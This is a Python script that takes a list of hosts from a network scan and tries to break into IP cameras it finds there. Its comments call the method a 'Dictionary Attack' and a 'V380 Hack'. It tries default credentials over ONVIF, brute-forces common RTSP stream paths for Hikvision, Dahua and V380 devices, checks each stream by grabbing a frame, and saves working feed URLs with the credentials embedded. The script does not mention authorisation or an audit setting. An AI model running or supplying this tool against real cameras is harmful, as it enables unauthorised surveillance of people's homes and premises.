import json
import cv2
import sys
import os
import time

# Attempt to import ONVIF, handle if missing
try:
    from onvif import ONVIFCamera
except ImportError:
    print("[-] Error: 'onvif-zeep' library not found. Install via: pip install onvif-zeep")
    sys.exit(1)

# --- CONFIGURATION ---
INPUT_FILE = "network_map.json"
OUTPUT_FILE = "valid_streams.json"

# Credentials to try for ONVIF (User, Password)
CREDENTIALS = [
    ('admin', 'admin'),
    ('admin', '123456'),
    ('root', 'root'),
    ('admin', 'password')
]

# Common RTSP paths for the Dictionary Attack
RTSP_PATHS = [
    '/live/ch0',
    '/stream1',
    '/unicast',
    '/av0_0',
    '/live/main',
    '/h264/ch1/main/av_stream',  # Hikvision common
    '/cam/realmonitor?channel=1&subtype=0' # Dahua common
]

def load_network_map():
    """Load the JSON map generated by the scanner."""
    if not os.path.exists(INPUT_FILE):
        print(f"[-] Error: {INPUT_FILE} not found. Run scanner.py first.")
        sys.exit(1)
    with open(INPUT_FILE, 'r') as f:
        return json.load(f)

def check_stream_validity(url):
    """
    Uses OpenCV to test if the stream is actually playable.
    Returns True if we can grab a frame.
    """
    print(f"    Testing stream: {url} ...", end="", flush=True)
    # Open the video stream
    cap = cv2.VideoCapture(url)
    
    # Check if opened successfully
    if not cap.isOpened():
        print(" Failed (Connection Refused).")
        return False
    
    # Try to read one frame to ensure it's not a dummy connection
    ret, frame = cap.read()
    cap.release()
    
    if ret:
        print(" Success!")
        return True
    else:
        print(" Failed (No Frame Data).")
        return False

# --- STEP 1: THE GOLD KEY (ONVIF) ---
def step_1_onvif(ip):
    """Attempt ONVIF handshake on port 80 or 8080."""
    ports = [80, 8080]
    
    for port in ports:
        for user, password in CREDENTIALS:
            try:
                # 1. Connect
                mycam = ONVIFCamera(ip, port, user, password)
                
                # 2. Create Media Service
                media = mycam.create_media_service()
                
                # 3. Get Profiles
                profiles = media.GetProfiles()
                if not profiles:
                    continue
                
                # 4. Get Stream URI
                token = profiles[0].token
                stream_uri_obj = media.GetStreamUri({
                    'StreamSetup': {'Stream': 'RTP-Unicast', 'Transport': {'Protocol': 'RTSP'}},
                    'ProfileToken': token
                })
                
                uri = stream_uri_obj.Uri
                
                # Inject credentials if missing from the URI
                if user not in uri:
                    prefix = "rtsp://"
                    if uri.startswith(prefix):
                        uri = f"{prefix}{user}:{password}@{uri[len(prefix):]}"
                
                return uri
            except Exception:
                continue
    return None

# --- STEP 2: THE SILVER KEY (RTSP DICTIONARY) ---
def step_2_rtsp_dictionary(ip):
    """Brute-force common RTSP paths."""
    # Simplified: Assuming admin/password or admin/123456 for the RTSP URL construction
    # In a production environment, you would iterate credentials here too.
    test_creds = [("admin", "password"), ("admin", "123456")]
    
    for user, pwd in test_creds:
        for path in RTSP_PATHS:
            url = f"rtsp://{user}:{pwd}@{ip}:554{path}"
            if check_stream_validity(url):
                return url
    return None

# --- STEP 3: THE BRONZE KEY (PROPRIETARY FALLBACK) ---
def step_3_proprietary(ip, vendor):
    """Handle specific difficult vendors."""
    if "V380" in vendor.upper():
        print("    [!] V380 Vendor detected. Forcing proprietary path.")
        url = f"rtsp://admin:password@{ip}:554/live/ch00_1"
        if check_stream_validity(url):
            return url
    return None

def main():
    devices = load_network_map()
    valid_results = []
    
    stats = {"ONVIF": 0, "RTSP": 0, "V380": 0}

    print(f"[*] Loaded {len(devices)} devices. Starting Triple-Key Protocol...\n")

    for device in devices:
        # Filter: Only process devices tagged as CAMERA
        if device.get('type') not in ['KNOWN_CAMERA_BRAND', 'POSSIBLE_CAMERA']:
            continue
            
        ip = device['ip']
        vendor = device.get('vendor', 'Unknown')
        print(f"--- Processing {ip} [{vendor}] ---")
        
        stream_url = None
        method_found = None

        # Step 1: ONVIF
        print("  [Step 1] Trying ONVIF...")
        stream_url = step_1_onvif(ip)
        if stream_url:
            method_found = "ONVIF"
            
        # Step 2: RTSP Dictionary (if Step 1 failed)
        if not stream_url:
            print("  [Step 2] ONVIF failed. Trying RTSP Dictionary...")
            stream_url = step_2_rtsp_dictionary(ip)
            if stream_url:
                method_found = "RTSP"

        # Step 3: Proprietary Fallback (if Step 2 failed)
        if not stream_url:
            print("  [Step 3] Dictionary failed. Checking Proprietary keys...")
            stream_url = step_3_proprietary(ip, vendor)
            if stream_url:
                method_found = "V380"

        # Finalize
        if stream_url:
            print(f"  [+] Success! Found stream via {method_found}: {stream_url}")
            device['stream_url'] = stream_url
            device['discovery_method'] = method_found
            valid_results.append(device)
            stats[method_found] += 1
        else:
            print("  [-] Failed. Could not determine a valid stream.")

    # Save Results
    with open(OUTPUT_FILE, 'w') as f:
        json.dump(valid_results, f, indent=4)
        
    # Summary
    print("\n" + "="*40)
    print(f"Found {len(valid_results)} cameras:")
    print(f" 1 via ONVIF: {stats['ONVIF']}")
    print(f" 1 via RTSP:  {stats['RTSP']}")
    print(f" 1 via V380 Hack: {stats['V380']}")
    print(f"Saved results to {OUTPUT_FILE}")
    print("="*40)

if __name__ == "__main__":
    main()
    